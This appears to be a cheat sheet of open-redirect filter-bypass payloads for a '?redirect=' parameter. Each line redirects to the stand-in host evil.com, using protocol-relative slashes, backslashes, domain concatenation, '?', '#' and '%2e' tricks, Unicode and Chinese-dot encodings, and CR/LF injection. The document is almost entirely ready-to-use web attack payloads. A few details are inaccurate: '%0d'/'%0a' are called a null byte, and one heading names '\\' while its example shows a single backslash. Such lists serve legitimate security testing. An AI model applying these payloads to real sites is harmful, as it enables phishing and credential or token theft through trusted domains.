***
Simpy try to change the domain:
```
?redirect=https://example.com -> ?redirect=https://evil.com
```
Bypass the filter when protocol is blacklisted using `//`
```
?redirect=https://example.com -> ?redirect=//evil.com
```
Bypass the filter double slash is blacklisted using `\\`
```
?redirect=https://example.com -> ?redirect=\evil.com
```
Bypass the filter when double slash is blacklisted `http:` or `https:`
```
?redirect=https://example.com -> ?redirect=https:evil.com
```
Bypass the filter if it only checks for domain name
```
?redirect=https://example.com -> ?redirect=example.comevil.com
```
Bypass the filter if it only checks for domain name using a dot `%2e`
```
?redirect=https://example.com -> ?redirect=example.com%2eevil.com
```
Bypass the filter if it only checks for domain name using a query/question mark `?`
```
?redirect=https://example.com -> ?redirect=evil.com?example.com
```
Bypass the filter if it only checks for domain name using a hash %23
```
?redirect=https://example.com -> ?redirect=evil.com%23example.com
```
Bypass the filter using a `○` symbol
```
?redirect=https://example.com -> ?redirect=https://example.com/○evil.com
```
Bypass the filter using a URL encoded Chinese dot `%E3%80%82`
```
?redirect=https://example.com -> ?redirect=evil.com%E3%80%82example.com
```
Bypass the filter if it only allows you to control the path using a nullbyte `%0d` or `%0a`
```
?redirect=https://example.com -> ?redirect=/%0d/evil.com
```